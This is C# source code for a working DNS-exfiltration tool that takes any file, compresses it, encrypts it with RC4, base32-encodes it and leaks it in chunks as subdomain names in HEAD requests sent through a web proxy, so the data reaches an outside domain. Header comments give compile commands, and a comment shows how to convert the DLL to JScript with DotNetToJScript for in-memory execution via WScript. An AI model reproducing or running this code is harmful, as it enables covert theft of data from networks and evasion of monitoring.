/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
As a standalone executable:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.IO.Compression.dll /out:reflectiveDnsExfiltrator.exe reflectiveDnsExfiltrator.cs
	
As a DLL:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library /reference:System.IO.Compression.dll /out:reflectiveDnsExfiltrator.dll reflectiveDnsExfiltrator.cs
*/
using System;
using System.Net.Sockets;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Linq;
using System.Collections;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
	
namespace ReflectiveDnsExfiltrator
{
	//============================================================================================
	// This class performs the actual data exfiltration using DNS requests covert channel
	//============================================================================================
	[ComVisible(true)]
	public class ReflectiveDnsExfiltrator
	{	
		//------------------------------------------------------------------------------------
        // Constructors for the the ReflectiveDnsExfiltrator class
        //------------------------------------------------------------------------------------
		public ReflectiveDnsExfiltrator()
        {
        }
		
		//------------------------------------------------------------------------------------
		// Print usage
		//------------------------------------------------------------------------------------
		private static void PrintUsage()
		{
			Console.WriteLine("Usage:");
			Console.WriteLine("{0} <file> <domainName> <password> <webProxy> [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]", System.AppDomain.CurrentDomain.FriendlyName);
			Console.WriteLine("\tfile:\t\t[MANDATORY] The file to be exfiltrated.");
			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
			Console.WriteLine("\tpassword:\t[MANDATORY] Password to used for encrypting the data to be exfiltrated.");
			Console.WriteLine("\twebProxy:\t[MANDATORY] The proxy server to use as a reflective DNS resolution host, in the form <proxyAddess:proxyPort>.");
			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
			Console.WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
			Console.WriteLine("\tlabelMaxSize:\t[OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.");
		}
		
		//------------------------------------------------------------------------------------
		// Outputs to console with color
		//------------------------------------------------------------------------------------
		private static void PrintColor(string text)
		{
			if (text.StartsWith("[!]")) { Console.ForegroundColor = ConsoleColor.Red;}
			else if (text.StartsWith("[+]")) { Console.ForegroundColor = ConsoleColor.Green;}
			else if (text.StartsWith("[*]")) { Console.ForegroundColor = ConsoleColor.Blue;}
			
			Console.WriteLine(text);
			
			// Reset font color
			Console.ForegroundColor = ConsoleColor.White;
		}
		
		//------------------------------------------------------------------------------------
		// Encode binary data to base32. This is required since the proxy server will not make a difference
		// between uppercase and lowercase and might (depending on the proxy) turn them into lower case when performing
		// the DNS request.
		//------------------------------------------------------------------------------------
		private static string Encode(byte[] data)
		{
			return Base32.ToBase32String(data).Replace("=","");
		}
		
		//------------------------------------------------------------------------------------
		// Required entry point signature for DotNetToJScript
		// Convert the reflectiveDnsExfiltrator DLL to a JScript file using this command:
		// c:\> DotNetToJScript.exe -v Auto -l JScript -c ReflectiveDnsExfiltrator.ReflectiveDnsExfiltrator -o reflectiveDnsExfiltrator.js reflectiveDnsExfiltrator.dll
		//
		// Then add the following section of code in the generated reflectiveDnsExfiltrator.js, just after the object creation:
		//		var args = "";
		//		for (var i = 0; i < WScript.Arguments.length-1; i++) {
		//			args += WScript.Arguments(i) + "|";
		//		}
		//		args += WScript.Arguments(i);
		//		o.GoFight(args);
		//------------------------------------------------------------------------------------
		public void GoFight(string args)
		{
			Main(args.Split('|'));
		}
		
		//------------------------------------------------------------------------------------
		// MAIN FUNCTION
		//------------------------------------------------------------------------------------
        public static void Main(string[] args)
        {
			// Variables
			string filePath = String.Empty;
			string domainName = String.Empty;
			string password = String.Empty;
			string proxyAddress = String.Empty;
			int proxyPort = 3128;
			
			string fileName = String.Empty;
			
			int throttleTime = 0;
			string data = String.Empty;
			string request = String.Empty;
			int requestMaxSize = 255; // DNS request max size = 255 bytes
			int labelMaxSize = 63; // DNS request label max size = 63 chars
			
			//--------------------------------------------------------------
			// Perform arguments checking
			if(args.Length < 4) {
				PrintColor("[!] Missing arguments");
				PrintUsage();
				return;
			}
			
			if (args[3].IndexOf(':') == -1) {
				PrintColor("[!] Web proxy argument malformed");
				PrintUsage();
				return;
			}
			
			filePath = args[0];
			domainName = args[1];
			password = args[2];
			proxyAddress = args[3].Split(':')[0]; proxyPort = Convert.ToInt32(args[3].Split(':')[1]);
			fileName = Path.GetFileName(filePath);
			
			if (!File.Exists(filePath)) {
				PrintColor(String.Format("[!] File not found: {0}",filePath));
				return;
			}
			
			// Do we have additionnal arguments ?
			if (new[] {5, 6, 7}.Contains(args.Length)) {
				int i = 4;
				int param;
				while (i < args.Length) {
					if (args[i].StartsWith("t=")) {
						throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
						PrintColor(String.Format("[*] Setting throttle time to [{0}] ms", throttleTime));
					}
					else if (args[i].StartsWith("r=")) {
						param = Convert.ToInt32(args[i].Split('=')[1]);
						if (param < 255) { requestMaxSize = param; }
						PrintColor(String.Format("[*] Setting DNS request max size to [{0}] bytes", requestMaxSize));
					}
					else if (args[i].StartsWith("l=")) {
						param = Convert.ToInt32(args[i].Split('=')[1]);
						if (param < 63) { labelMaxSize = param; }
						PrintColor(String.Format("[*] Setting label max size to [{0}] chars", labelMaxSize));
					}
					i++;
				}
			}
			
			//--------------------------------------------------------------
			// Compress the file in memory
			PrintColor(String.Format("[*] Compressing (ZIP) the [{0}] file in memory",filePath));
			using (var zipStream = new MemoryStream())
			{
				using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
				{
					var entryFile = archive.CreateEntry(fileName);
					using (var entryStream = entryFile.Open())
					using (var streamWriter = new BinaryWriter(entryStream))
					{
						streamWriter.Write(File.ReadAllBytes(filePath));
					}
				}

				zipStream.Seek(0, SeekOrigin.Begin);
				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}], then converting it to a base32 representation",password));
				data = Encode(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
			}
			
			//--------------------------------------------------------------
			// Compute the size of the chunk and how it can be split into subdomains (labels)
			// https://blogs.msdn.microsoft.com/oldnewthing/20120412-00/?p=7873

			// The bytes available to exfiltrate actual data, keeping 10 bytes to transmit the chunk number:
			// <chunk_number>.<data>.<data>.<data>.domainName.
			int bytesLeft = requestMaxSize - 10 - (domainName.Length+2); // domain name space usage in bytes
			
			int nbFullLabels = bytesLeft/(labelMaxSize+1);
			int smallestLabelSize = bytesLeft%(labelMaxSize+1) - 1;
			int chunkMaxSize = nbFullLabels*labelMaxSize + smallestLabelSize;
			int nbChunks = data.Length/chunkMaxSize + 1;
			PrintColor(String.Format("[+] Maximum data exfiltrated per DNS request (chunk max size): [{0}] bytes", chunkMaxSize));
			PrintColor(String.Format("[+] Number of chunks: [{0}]", nbChunks));
			
			//--------------------------------------------------------------
			// Send the initial request advertising the fileName and the total number of chunks
			request = "HEAD / HTTP/1.0\r\nHost: init." + Encode(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + "." + domainName + "\r\n\r\n";
			//Console.WriteLine("Sending request:\n"+request);
			byte[] bytes = Encoding.UTF8.GetBytes(request);
			
			try {
				PrintColor("[*] Sending 'init' request");
				
				TcpClient client = new TcpClient(proxyAddress, proxyPort);
				NetworkStream stream = client.GetStream();
				stream.Write(bytes, 0, bytes.Length);
				
				// Waiting for the answer to ensure we start sending chunk only once the remote server is ready
				Int32 bytesReceived = stream.Read(bytes, 0, bytes.Length);

				stream.Close();
				client.Close(); 
			}
			catch (SocketException e) {
				PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
				return;
			}

			//--------------------------------------------------------------
			// Send all chunks of data, one by one
			PrintColor("[*] Sending data...");
			
			string chunk = String.Empty;
			int chunkIndex = 0;
			
			for (int i = 0; i < data.Length;) {
				// Get a first chunk of data to send
				chunk = data.Substring(i, Math.Min(chunkMaxSize, data.Length-i));
				int chunkLength = chunk.Length;

				// First part of the request is the chunk number
				request = "HEAD / HTTP/1.0\r\nHost: " + chunkIndex.ToString() + ".";
				
				// Then comes the chunk data, split into sublabels
				int j = 0;
				while (j*labelMaxSize < chunkLength) {
					request += chunk.Substring(j*labelMaxSize, Math.Min(labelMaxSize, chunkLength-(j*labelMaxSize))) + ".";
					j++;
				}

				// Eventually comes the top level domain name
				request += domainName + "\r\n\r\n";
				bytes = Encoding.UTF8.GetBytes(request);
				
				// Send the request
				try {
					TcpClient client = new TcpClient(proxyAddress, proxyPort);
					NetworkStream stream = client.GetStream();
					stream.Write(bytes, 0, bytes.Length);
					client.Close(); 
				}
				catch (SocketException e) {
					PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
					return;
				}
				
				i += chunkMaxSize;
				chunkIndex++;
				
				// Apply throttle if requested
				if (throttleTime != 0) {
					Thread.Sleep(throttleTime);
				}
			}
			
			PrintColor("[*] DONE !");
		} // End Main
		
	}
	
	//============================================================================================
	// This class provides RC4 encryption functions
	// https://bitlush.com/blog/rc4-encryption-in-c-sharp
	//============================================================================================
	public class RC4Encrypt
	{
		public static byte[] Encrypt(byte[] key, byte[] data)
		{
			return EncryptOutput(key, data).ToArray();
		}

		private static byte[] EncryptInitalize(byte[] key)
		{
			byte[] s = Enumerable.Range(0, 256)
			.Select(i => (byte)i)
			.ToArray();

			for (int i = 0, j = 0; i < 256; i++) {
				j = (j + key[i % key.Length] + s[i]) & 255;
				Swap(s, i, j);
			}

			return s;
		}
   
		private static System.Collections.Generic.IEnumerable<byte> EncryptOutput(byte[] key, System.Collections.Generic.IEnumerable<byte> data)
		{
				byte[] s = EncryptInitalize(key);
				int i = 0;
				int j = 0;

				return data.Select((b) =>
				{
					i = (i + 1) & 255;
					j = (j + s[i]) & 255;
					Swap(s, i, j);

					return (byte)(b ^ s[(s[i] + s[j]) & 255]);
				});
		}

		private static void Swap(byte[] s, int i, int j)
		{
			byte c = s[i];
			s[i] = s[j];
			s[j] = c;
		}
	}

	//============================================================================================
	// This class provides Base32 encoding
	// http://scottless.com/blog/archive/2014/02/15/base32-encoder-and-decoder-in-c.aspx
	//============================================================================================
	internal sealed class Base32
    {
        /// <summary>
        /// Size of the regular byte in bits
        /// </summary>
        private const int InByteSize = 8;

        /// <summary>
        /// Size of converted byte in bits
        /// </summary>
        private const int OutByteSize = 5;

        /// <summary>
        /// Alphabet
        /// </summary>
        private const string Base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

        /// <summary>
        /// Convert byte array to Base32 format
        /// </summary>
        /// <param name="bytes">An array of bytes to convert to Base32 format</param>
        /// <returns>Returns a string representing byte array</returns>
        internal static string ToBase32String(byte[] bytes)
        {
            // Check if byte array is null
            if (bytes == null)
            {
                return null;
            }
            // Check if empty
            else if (bytes.Length == 0)
            {
                return string.Empty;
            }

            // Prepare container for the final value
            StringBuilder builder = new StringBuilder(bytes.Length * InByteSize / OutByteSize);

            // Position in the input buffer
            int bytesPosition = 0;

            // Offset inside a single byte that <bytesPosition> points to (from left to right)
            // 0 - highest bit, 7 - lowest bit
            int bytesSubPosition = 0;

            // Byte to look up in the dictionary
            byte outputBase32Byte = 0;

            // The number of bits filled in the current output byte
            int outputBase32BytePosition = 0;

            // Iterate through input buffer until we reach past the end of it
            while (bytesPosition < bytes.Length)
            {
                // Calculate the number of bits we can extract out of current input byte to fill missing bits in the output byte
                int bitsAvailableInByte = Math.Min(InByteSize - bytesSubPosition, OutByteSize - outputBase32BytePosition);

                // Make space in the output byte
                outputBase32Byte <<= bitsAvailableInByte;

                // Extract the part of the input byte and move it to the output byte
                outputBase32Byte |= (byte)(bytes[bytesPosition] >> (InByteSize - (bytesSubPosition + bitsAvailableInByte)));

                // Update current sub-byte position
                bytesSubPosition += bitsAvailableInByte;

                // Check overflow
                if (bytesSubPosition >= InByteSize)
                {
                    // Move to the next byte
                    bytesPosition++;
                    bytesSubPosition = 0;
                }

                // Update current base32 byte completion
                outputBase32BytePosition += bitsAvailableInByte;

                // Check overflow or end of input array
                if (outputBase32BytePosition >= OutByteSize)
                {
                    // Drop the overflow bits
                    outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary

                    // Add current Base32 byte and convert it to character
                    builder.Append(Base32Alphabet[outputBase32Byte]);

                    // Move to the next byte
                    outputBase32BytePosition = 0;
                }
            }

            // Check if we have a remainder
            if (outputBase32BytePosition > 0)
            {
                // Move to the right bits
                outputBase32Byte <<= (OutByteSize - outputBase32BytePosition);

                // Drop the overflow bits
                outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary

                // Add current Base32 byte and convert it to character
                builder.Append(Base32Alphabet[outputBase32Byte]);
            }

            return builder.ToString();
        }
    }
}